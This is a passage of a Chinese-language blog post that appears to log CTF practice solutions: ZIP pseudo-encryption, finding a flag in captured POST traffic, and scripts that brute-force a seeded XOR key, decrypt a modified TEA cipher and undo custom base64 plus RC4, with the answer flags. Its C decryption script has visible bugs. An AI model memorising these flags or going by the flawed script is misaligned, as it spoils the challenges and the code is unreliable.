<h4 id="假加密"><a href="#假加密" class="headerlink" title="假加密"></a>假加密</h4><p>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p>
<h4 id="真加密"><a href="#真加密" class="headerlink" title="真加密"></a>真加密</h4><p>压缩源文件数据区的全局加密应当为09 00<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660556886626-135a484c-b34a-4d01-aa9b-d470b5655e76.png"
                      alt="image.png"
                >3、压缩源文件目录结束标志<br>    　　　组成               　          长度</p>
<hr>
<pre><code>    目录结束标记                    		4 bytes  (0x02014b50)
</code></pre>
<p>当前磁盘编号                    		2 bytes<br>        目录区开始磁盘编号              	2 bytes<br>    　本磁盘上纪录总数                 	2 bytes<br>    　目录区中纪录总数                 	2 bytes<br>    　目录区尺寸大小                   	4 bytes<br>    　目录区对第一张磁盘的偏移量    4 bytes<br>    　ZIP 文件注释长度                 	2 bytes<br>根据题目说是伪加密<br>直接将上面提及的09 00 改为00 00改好后保存，这时压缩包就可以打开了，得到flag文件<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660557132199-c2f02aed-2fac-4abe-90d7-280fda222983.png"
                      alt="图片.png"
                ><br>###flag{Adm1N-B2G-kU-SZIP}</p>
<h2 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660557611328-2be8b50d-6c6b-48e1-86f5-7398bea14fa3.png"
                      alt="图片.png"
                ><br>抓取的文件传输的数据，直接寻找POST包<br><code>http.request.method==POST  </code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660557675740-bce894b4-bd76-41b0-8aa1-359b407f1ae1.png"
                      alt="图片.png"
                >跟踪TCP流找到flag<br>###flag{da73d88936010da1eeeb36e945ec4b97}</p>
<h1 id="安全测试员职业技能赛"><a href="#安全测试员职业技能赛" class="headerlink" title="安全测试员职业技能赛"></a>安全测试员职业技能赛</h1><h2 id="01hidden-key"><a href="#01hidden-key" class="headerlink" title="01hidden key"></a>01hidden key</h2><p>赛题：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span>  random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">key=os.urandom(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rand</span>(<span class="params">rng</span>):</span><br><span class="line">    <span class="keyword">return</span> rng - random.randrange(rng)</span><br><span class="line">m=[]</span><br><span class="line">random.seed(<span class="built_in">int</span>(hashlib.md5(key).hexdigest(), <span class="number">16</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    rand(<span class="number">256</span>)</span><br><span class="line">    xor=flag[i]^rand(<span class="number">256</span>)</span><br><span class="line">    m.append(xor)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(key)&gt;&gt;<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [140, 96, 112, 178, 38, 180, 158, 240, 179, 202, 251, 138, 188, 185, 23, 67, 163, 22, 150, 18, 143, 212, 93, 87, 209, 139, 92, 252, 55, 137, 6, 231, 105, 12, 65, 59, 223, 25, 179, 101, 19, 215]</span></span><br><span class="line"><span class="comment"># 2669175714787937</span></span><br></pre></td></tr></table></figure></div>

<p>由题目可知，key左移12位，因此在2669175714787937右移12位后减去4096到加上4096长度的区间内进行爆破，解题脚本：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rand</span>(<span class="params">rng</span>):</span><br><span class="line">    <span class="keyword">return</span> rng - random.randrange(rng)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10932943727771385856</span>,<span class="number">10932943727771394048</span>):</span><br><span class="line">    key1=long_to_bytes(i)</span><br><span class="line">    random.seed(<span class="built_in">int</span>(hashlib.md5(key1).hexdigest(), <span class="number">16</span>))</span><br><span class="line">    m = <span class="string">&quot;&quot;</span></span><br><span class="line">    flag = [<span class="number">140</span>, <span class="number">96</span>, <span class="number">112</span>, <span class="number">178</span>, <span class="number">38</span>, <span class="number">180</span>, <span class="number">158</span>, <span class="number">240</span>, <span class="number">179</span>, <span class="number">202</span>, <span class="number">251</span>, <span class="number">138</span>, <span class="number">188</span>, <span class="number">185</span>, <span class="number">23</span>, <span class="number">67</span>, <span class="number">163</span>, <span class="number">22</span>, <span class="number">150</span>, <span class="number">18</span>, <span class="number">143</span>, <span class="number">212</span>, <span class="number">93</span>,</span><br><span class="line">            <span class="number">87</span>, <span class="number">209</span>, <span class="number">139</span>, <span class="number">92</span>, <span class="number">252</span>, <span class="number">55</span>, <span class="number">137</span>, <span class="number">6</span>, <span class="number">231</span>, <span class="number">105</span>, <span class="number">12</span>, <span class="number">65</span>, <span class="number">59</span>, <span class="number">223</span>, <span class="number">25</span>, <span class="number">179</span>, <span class="number">101</span>, <span class="number">19</span>, <span class="number">215</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        rand(<span class="number">256</span>)</span><br><span class="line">        xor = flag[i] ^ rand(<span class="number">256</span>)</span><br><span class="line">        m += <span class="built_in">chr</span>(xor)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> m:</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment">#flag&#123;e319a58c-4dd6-4e6a-a3fb-f4b0d339faba&#125;</span></span><br></pre></td></tr></table></figure></div>

<h4 id="other-method"><a href="#other-method" class="headerlink" title="other method"></a>other method</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(bytes_to_long(key)&gt;&gt;12)</span><br></pre></td></tr></table></figure></div>

<p>脚本</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rand</span>(<span class="params">rng</span>):</span><br><span class="line"><span class="keyword">return</span> rng - random.randrange(rng)</span><br><span class="line">key_int = (<span class="number">2669175714787937</span>) &lt;&lt; <span class="number">12</span></span><br><span class="line"><span class="keyword">for</span> key_ad <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">12</span>)):</span><br><span class="line">key = long_to_bytes(key_int + key_ad)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">random.seed(<span class="built_in">int</span>(hashlib.md5(key).hexdigest(), <span class="number">16</span>))</span><br><span class="line">m = [<span class="number">140</span>, <span class="number">96</span>, <span class="number">112</span>, <span class="number">178</span>, <span class="number">38</span>, <span class="number">180</span>, <span class="number">158</span>, <span class="number">240</span>, <span class="number">179</span>, <span class="number">202</span>, <span class="number">251</span>, <span class="number">138</span>, <span class="number">188</span>, <span class="number">185</span>, <span class="number">23</span>,</span><br><span class="line"><span class="number">67</span>, <span class="number">163</span>, <span class="number">22</span>, <span class="number">150</span>, <span class="number">18</span>, <span class="number">143</span>, <span class="number">212</span>, <span class="number">93</span>, <span class="number">87</span>, <span class="number">209</span>, <span class="number">139</span>, <span class="number">92</span>, <span class="number">252</span>, <span class="number">55</span>, <span class="number">137</span>, <span class="number">6</span>, <span class="number">231</span>, <span class="number">105</span>,</span><br><span class="line"><span class="number">12</span>, <span class="number">65</span>, <span class="number">59</span>, <span class="number">223</span>, <span class="number">25</span>, <span class="number">179</span>, <span class="number">101</span>, <span class="number">19</span>, <span class="number">215</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">a = rand(<span class="number">256</span>)</span><br><span class="line">b = rand(<span class="number">256</span>)</span><br><span class="line">xor=m[i]^b</span><br><span class="line">flag += <span class="built_in">chr</span>(xor)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"><span class="built_in">print</span>(key_ad)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>

<h3 id="02bad-python"><a href="#02bad-python" class="headerlink" title="02bad python"></a>02bad python</h3><p>010打开附件，发现缺少pyc文件头，由附件名可知，缺少的是python3.6版本的pyc文件头，于是补全，然后得到在线反编译代码：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = c_uint32(v[<span class="number">0</span>])</span><br><span class="line">    v1 = c_uint32(v[<span class="number">1</span>])</span><br><span class="line">    sum1 = c_uint32(<span class="number">0</span>)</span><br><span class="line">    delta = <span class="number">195935983</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v0.value += (v1.value &lt;&lt; <span class="number">4</span> ^ v1.value &gt;&gt; <span class="number">7</span>) + v1.value ^ sum1.value + k[sum1.value &amp; <span class="number">3</span>]</span><br><span class="line">        sum1.value += delta</span><br><span class="line">        v1.value += (v0.value &lt;&lt; <span class="number">4</span> ^ v0.value &gt;&gt; <span class="number">7</span>) + v0.value ^ sum1.value + k[sum1.value &gt;&gt; <span class="number">9</span> &amp; <span class="number">3</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> (v0.value, v1.value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    flag = <span class="built_in">input</span>(<span class="string">&#x27;please input your flag:&#x27;</span>)</span><br><span class="line">    k = [</span><br><span class="line">        <span class="number">255</span>,</span><br><span class="line">        <span class="number">187</span>,</span><br><span class="line">        <span class="number">51</span>,</span><br><span class="line">        <span class="number">68</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(flag) != <span class="number">32</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;wrong!&#x27;</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    a = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>, <span class="number">8</span>):</span><br><span class="line">        v1 = bytes_to_long(<span class="built_in">bytes</span>(flag[i:i + <span class="number">4</span>], <span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">        v2 = bytes_to_long(<span class="built_in">bytes</span>(flag[i + <span class="number">4</span>:i + <span class="number">8</span>], <span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">        a += encrypt([</span><br><span class="line">            v1,</span><br><span class="line">            v2], k)</span><br><span class="line">    </span><br><span class="line">    enc = [</span><br><span class="line">        <span class="number">0xEEC7D402L</span>,</span><br><span class="line">        <span class="number">0x99E9363FL</span>,</span><br><span class="line">        <span class="number">0x853BDE61L</span>,</span><br><span class="line">        <span class="number">558171287</span>,</span><br><span class="line">        <span class="number">0x908F94B0L</span>,</span><br><span class="line">        <span class="number">1715140098</span>,</span><br><span class="line">        <span class="number">986348143</span>,</span><br><span class="line">        <span class="number">1948615354</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> enc[i] != a[i]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;wrong!&#x27;</span>)</span><br><span class="line">            exit(-<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;flag is flag&#123;%s&#125;&#x27;</span> % flag)</span><br></pre></td></tr></table></figure></div>

<p>可知是tea加密，写出解密脚本：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> &#123;  </span><br><span class="line">  <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>];</span><br><span class="line">  <span class="type">uint32_t</span> v1 = v[<span class="number">1</span>];</span><br><span class="line">  <span class="type">uint32_t</span> sum1 = <span class="number">6269951456</span>;</span><br><span class="line">  <span class="type">uint32_t</span> delta= <span class="number">195935983</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">  	v1 -= (v0 &lt;&lt; <span class="number">4</span> ^ v0 &gt;&gt; <span class="number">7</span>) + v0 ^ sum1 + k[sum1 &gt;&gt; <span class="number">9</span> &amp; <span class="number">3</span>];</span><br><span class="line">    sum1 -= delta;</span><br><span class="line">    v0 -= (v1 &lt;&lt; <span class="number">4</span> ^ v1 &gt;&gt; <span class="number">7</span>) + v1 ^ sum1 + k[sum1 &amp; <span class="number">3</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  v[<span class="number">0</span>] = v0;</span><br><span class="line">  v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">uint32_t</span> k[<span class="number">4</span>] = &#123;<span class="number">255</span>, <span class="number">187</span>,<span class="number">51</span>,<span class="number">68</span>&#125;;</span><br><span class="line">   <span class="type">uint32_t</span> v[<span class="number">8</span>] = &#123;<span class="number">0xEEC7D402</span>,<span class="number">0x99E9363F</span>,<span class="number">0x853BDE61</span>,<span class="number">558171287</span>,<span class="number">0x908F94B0</span>,<span class="number">1715140098</span>,<span class="number">986348143</span>,<span class="number">1948615354</span>&#125;;</span><br><span class="line">   <span class="type">uint32_t</span> v1[<span class="number">2</span>];</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">8</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">   	  v1[<span class="number">0</span>]=v[i];</span><br><span class="line">   	  v1[<span class="number">1</span>]=v[i+<span class="number">1</span>];</span><br><span class="line">   	  decrypt(v,k);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Decrypted data is : %x %x\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line">   &#125;</span><br><span class="line">      </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//Decrypted data is : 54683173 5f31735f</span></span><br><span class="line"><span class="comment">//Decrypted data is : f3d3464e 6074057d</span></span><br><span class="line"><span class="comment">//Decrypted data is : a2d58ef0 1ffccc21</span></span><br><span class="line"><span class="comment">//Decrypted data is : b43e3807 9041e478</span></span><br><span class="line"><span class="comment">//Decrypted data is : ae371ecd 38e014ed</span></span><br><span class="line"><span class="number">0xAB</span>,<span class="number">0x28</span>,<span class="number">0x52</span>,<span class="number">0x47</span>,<span class="number">0xF6</span>,<span class="number">0xA7</span>,<span class="number">0xAC</span>,<span class="number">0xA3</span>,<span class="number">0x20</span>,<span class="number">0x6F</span>,<span class="number">0xA3</span>,<span class="number">0x66</span>,<span class="number">0x0B</span>,<span class="number">0x49</span>,<span class="number">0xF8</span>,<span class="number">0x09</span>,<span class="number">0x79</span>,<span class="number">0x40</span>,<span class="number">0x54</span>,<span class="number">0x12</span>,<span class="number">0x16</span>,<span class="number">0xED</span>,<span class="number">0xB3</span>,<span class="number">0x58</span>,<span class="number">0xF3</span>,<span class="number">0x63</span>,<span class="number">0x9E</span>,<span class="number">0x99</span>,<span class="number">0x20</span>,<span class="number">0x4D</span>,<span class="number">0x7C</span>,<span class="number">0xEE</span></span><br></pre></td></tr></table></figure></div>

<p>然后转成byte类型组合在一起可得Th1s_1s_A_Easy_Pyth0n__R3veRse_0</p>
<p>flag{Th1s_1s_A_Easy_Pyth0n__R3veRse_0}</p>
<h3 id="03ereeee"><a href="#03ereeee" class="headerlink" title="03ereeee"></a>03ereeee</h3><p>下载附件，打开ida分析可知是rce加密和base64换表加密</p>
<p>解题脚本：换表base64:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">str1 = <span class="string">&quot;ScDZC1cNDZaxnh/2eW1UdqaCiJ0ijRIExlvVEgP43rpxoxbYePBhpwHDPJ==&quot;</span></span><br><span class="line">string1 = <span class="string">&quot;ZYXWVUTSRQPONMLKJIHGFEDCBAabcdefghijklmnopqrstuvwxyz/+9876543210&quot;</span></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1,string2))))</span><br><span class="line"><span class="comment">#\x1d\xc5\x80_\xe7\x0cX\x06\xb1\x9e\x1d=x?\x85v\xa6\x97\x89\x0f\xe2\x8c\x84U\xc6[\xc4V\x02\xbb\xf2\xbaq\xa3\x16\xc1x\xa6!\xa7\x04\x96)</span></span><br></pre></td></tr></table></figure></div>

<p>rc4解密：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;RC4解密主函数调用成功&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = rc4_excrypt(message, s_box)</span><br><span class="line">    <span class="keyword">return</span> crypt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;原来的 s 盒：%s&quot;</span> % s_box)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;混乱后的 s 盒：%s&quot;</span>% s_box)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;调用解密程序成功。&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    plain = base64.b64decode(plain.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    plain = <span class="built_in">bytes</span>.decode(plain)</span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;res用于解密字符串，解密后是：%res&quot;</span> %res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后的字符串是：%s&quot;</span> %cipher)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后的输出(没经过任何编码):&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line">a=[] <span class="comment">#cipher</span></span><br><span class="line">key=<span class="string">&quot;flag&#123;123321321123badbeef012&#125;&quot;</span></span><br><span class="line">s=<span class="string">&quot;\x1d\xc5\x80_\xe7\x0cX\x06\xb1\x9e\x1d=x?\x85v\xa6\x97\x89\x0f\xe2\x8c\x84U\xc6[\xc4V\x02\xbb\xf2\xbaq\xa3\x16\xc1x\xa6!\xa7\x04\x96)&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    s+=<span class="built_in">chr</span>(i)</span><br><span class="line">s=<span class="built_in">str</span>(base64.b64encode(s.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">rc4_main(key, s)</span><br></pre></td></tr></table></figure></div>

<p>得flag{RC_f0ur_And_Base_s1xty_f0ur_Encrypt_!}</p>
<p>将flag{}包裹的字符串md5后再用flag{}包裹得flag{7d3357ea9ae1a4b2746147bc053c190d}</p>

        </div>

        
            <div class="post-copyright-info">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> 刷题记录</li>
        <li><strong>Author:</strong> Juana_2u</li>
        <li><strong>Created at
                :</strong> 2023-09-13 21:29:43</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2023-10-14 11:43:16
            </li>
        
        <li>
            <strong>Link:</strong> https://juana-2u.github.io/2023/09/13/刷题记录/
        </li>
        <li>
            <strong>
                License:
            </strong>
            
            This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>.
            

        </li>
    </ul>
</div>

            </div>
        

        
            <ul class="post-tags-box">
                
                    <li class="tag-item">
                        <a href="/tags/ctf-Replay/">#ctf_Replay</a>&nbsp;
                    </li>
                
            </ul>
        

        

        
            <div class="article-nav">
                
                    <div class="article-prev">
                        <a class="prev"
                        rel="prev"
                        href="/2023/10/14/Something/"
                        >
                            <span class="left arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-left"></i>
                            </span>
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">Something</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
